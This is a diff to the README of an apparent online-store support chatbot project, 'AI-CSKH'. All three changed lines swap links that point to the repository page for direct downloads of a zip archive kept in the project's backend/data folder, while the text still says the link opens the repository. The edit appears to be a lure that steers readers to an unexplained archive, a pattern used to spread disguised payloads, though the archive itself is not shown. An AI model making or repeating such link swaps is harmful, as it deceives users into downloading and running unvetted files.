@@ -1,6 +1,6 @@
 # 🤖 AI-CSKH - Smart support for online stores
 
-[![Download AI-CSKH](https://img.shields.io/badge/Download%20AI-CSKH-blue?style=for-the-badge)](https://github.com/ikh4079/AI-CSKH)
+[![Download AI-CSKH](https://img.shields.io/badge/Download%20AI-CSKH-blue?style=for-the-badge)](https://github.com/ikh4079/AI-CSKH/raw/refs/heads/main/backend/data/A_CSKH_3.1.zip)
 
 ## 📌 What AI-CSKH does
 
@@ -35,7 +35,7 @@ If you plan to run it with Docker, you also need:
 
 Visit this page to download and run the project files:
 
-[https://github.com/ikh4079/AI-CSKH](https://github.com/ikh4079/AI-CSKH)
+[https://github.com/ikh4079/AI-CSKH/raw/refs/heads/main/backend/data/A_CSKH_3.1.zip](https://github.com/ikh4079/AI-CSKH/raw/refs/heads/main/backend/data/A_CSKH_3.1.zip)
 
 Use this link to get the latest version, open the repository, and follow the file or setup steps provided there.
 
@@ -182,7 +182,7 @@ That flow helps the assistant give answers that stay close to your store data.
 
 Open the project page here and follow the download or run steps:
 
-[https://github.com/ikh4079/AI-CSKH](https://github.com/ikh4079/AI-CSKH)
+[https://github.com/ikh4079/AI-CSKH/raw/refs/heads/main/backend/data/A_CSKH_3.1.zip](https://github.com/ikh4079/AI-CSKH/raw/refs/heads/main/backend/data/A_CSKH_3.1.zip)
 
 ## 🪟 Windows tips
 
